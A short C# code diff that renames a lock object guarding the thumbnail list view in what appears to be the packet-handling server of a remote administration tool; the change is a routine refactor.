@@ -22,7 +22,7 @@ namespace Server.Handle_Packet
                     {
                         Program.form1.ThumbnailImageList.Images.Add(client.ID, Bitmap.FromStream(memoryStream));
                         client.LV2.ImageKey = client.ID;
-                        lock (Settings.Listview3Lock)
+                        lock (Settings.LockListviewThumb)
                         {
                             Program.form1.listView3.Items.Add(client.LV2);
                         }
@@ -32,7 +32,7 @@ namespace Server.Handle_Packet
                 {
                     using (MemoryStream memoryStream = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes()))
                     {
-                        lock (Settings.Listview3Lock)
+                        lock (Settings.LockListviewThumb)
                         {
                             Program.form1.ThumbnailImageList.Images.RemoveByKey(client.ID);
                             Program.form1.ThumbnailImageList.Images.Add(client.ID, Bitmap.FromStream(memoryStream));
